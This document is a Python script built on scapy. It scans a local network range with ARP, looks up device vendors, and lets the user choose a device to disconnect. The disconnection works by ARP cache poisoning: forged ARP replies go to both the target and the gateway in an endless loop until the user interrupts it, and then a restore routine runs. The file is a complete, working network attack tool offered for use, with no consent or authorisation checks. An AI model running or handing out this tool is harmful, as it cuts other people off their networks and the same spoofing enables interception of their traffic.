import scapy.all as sc
import requests
import time

def get_mac(ip):
    arp_request = sc.ARP(pdst=ip)
    broadcast = sc.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = sc.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    
    return answered_list[0][1].hwsrc if answered_list else None

def get_mac_vendor(mac_address):
    url = f"https://api.macvendors.com/{mac_address}"
    try:
        response = requests.get(url)
        if response.status_code == 200:
            return response.text
        else:
            print(f"Error: Received status code {response.status_code} for MAC {mac_address}")
            return "Vendor not found"
    except requests.RequestException as e:
        print(f"Error: {e} for MAC {mac_address}")
        return "Vendor not found"

def scan(ip_range):
    arp_request = sc.ARP(pdst=ip_range)
    broadcast = sc.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = sc.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    
    clients_list = []
    for element in answered_list:
        mac_address = element[1].hwsrc
        vendor = get_mac_vendor(mac_address)
        client_dict = {"ip": element[1].psrc, "mac": mac_address, "vendor": vendor}
        clients_list.append(client_dict)
        time.sleep(1)  # To avoid hitting the API rate limit

    return clients_list

def print_result(results_list):
    print("ID\tIP\t\t\tMAC Address\t\t\tVendor\n------------------------------------------------------------")
    for idx, client in enumerate(results_list):
        print(f"{idx}\t{client['ip']}\t\t{client['mac']}\t\t{client['vendor']}")

def kick_device_off_wifi(target_ip, gateway_ip):
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    
    if not target_mac or not gateway_mac:
        print("Could not find MAC address for the given IPs.")
        return
    
    # Create ARP response packets to poison the ARP cache of the target and the gateway
    poison_target = sc.ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac)
    poison_gateway = sc.ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac)
    
    print(f"Sending ARP poison packets to {target_ip} and {gateway_ip}...")
    
    try:
        while True:
            sc.send(poison_target, verbose=False)
            sc.send(poison_gateway, verbose=False)
            time.sleep(2)
    except KeyboardInterrupt:
        print("ARP poisoning stopped. Restoring network...")
        restore_network(target_ip, gateway_ip, target_mac, gateway_mac)

def restore_network(target_ip, gateway_ip, target_mac, gateway_mac):
    restore_target = sc.ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac)
    restore_gateway = sc.ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac)
    
    sc.send(restore_target, count=4, verbose=False)
    sc.send(restore_gateway, count=4, verbose=False)
    print("Network restored.")

# Main program
ip_range = input("Enter the IP address range (e.g., 192.168.1.1/24): ")
scan_result = scan(ip_range)
print_result(scan_result)

device_id = int(input("Enter the ID of the device to kick off the network: "))
target_ip = scan_result[device_id]['ip']
gateway_ip = input("Enter the gateway IP address: ")

kick_device_off_wifi(target_ip, gateway_ip)
